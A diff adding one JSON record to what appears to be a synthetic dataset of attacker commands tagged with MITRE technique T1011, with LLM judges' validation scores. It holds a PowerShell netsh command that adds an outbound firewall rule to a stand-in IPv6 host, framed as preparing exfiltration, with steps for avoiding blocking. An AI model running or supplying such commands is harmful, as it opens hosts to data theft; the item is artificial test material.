@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh advfirewall firewall add rule name=\"exfil_out_tcp6_49444\" dir=out action=allow enable=yes protocol=TCP remoteport=49444 remoteip=2001:db8:bad:cafe::44 profile=any",
+  "explanation": "Adds a narrowly scoped outbound firewall rule to allow IPv6 TCP egress to a specific high port/host used for alternate-medium exfiltration (T1011).",
+  "rationale_steps": [
+    "Open only the exact IPv6 destination and high TCP port needed for exfiltration.",
+    "Minimize side effects by scoping to a single remote IP and port.",
+    "Permit exfil over a non-standard IPv6 path unlikely to be blocked by default."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-53a96244",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed netsh advfirewall add rule with valid parameters, balanced quoting, and correct flag usage.",
+        "semantic_score": 2,
+        "semantic_justification": "This adds a firewall allow rule (requires admin, so fails under 'Privilege: None') and does not itself implement Traffic Signaling, only facilitates potential egress.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T16:38:42.365320Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct `netsh` syntax, valid flags, and balanced quoting for all parameters.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command's structure is correct for adding a firewall rule to facilitate the described traffic, it fundamentally contradicts the stated 'Privilege: None' as adding firewall rules requires administrative privileges, rendering it operationally unfeasible as described.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T16:38:58.025022Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
